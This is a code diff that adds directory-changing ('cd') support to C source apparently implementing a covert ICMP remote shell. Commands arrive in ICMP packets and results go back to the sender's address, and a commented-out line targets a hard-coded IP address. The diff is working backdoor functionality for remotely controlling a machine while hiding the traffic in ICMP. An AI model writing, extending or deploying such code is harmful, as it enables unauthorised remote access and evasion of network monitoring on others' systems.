@@ -29,6 +29,22 @@ typedef unsigned char uint8;
 #define OUT_BUF_SIZE 64
 #define BUFFER2 1000
 
+int changedir(char* buffer, char* path) {
+    int i;
+    int j;
+    bzero(path, 4096);
+    for (i = 3, j = 0; i < 256; i++, j++) {
+        if(buffer[i] == '\n') break;
+        path[j] = buffer[i];
+    }
+
+    if (chdir(path) != 0) {
+        return 1;
+    }
+
+    return 0;
+}
+
 pthread_t MyCreateThread(void * (*func)(void *), void *lparam)
 {
     pthread_attr_t attr;
@@ -225,6 +241,15 @@ void *receive_icmp_data(void *lparam){
               //sprintf(pwd, "Moved to: %s", getcwd(pwdbuff, 100));
               //icmp_sendrequest(sockfd, inet_addr("192.168.1.13"), pwd, sizeof(pwd));
             //}
+            char path[4096];
+
+            if (strncmp(exec_command, "cd ", 3) == 0) {
+              if (changedir(exec_command, path) != 0) {
+                icmp_sendrequest(sockfd, ip->saddr, "Could not cd to path", 20);
+              }else{
+                icmp_sendrequest(sockfd, ip->saddr, "OK", 2);
+              }
+            }
 
             FILE *output;
             char buffer[BUFFER2];
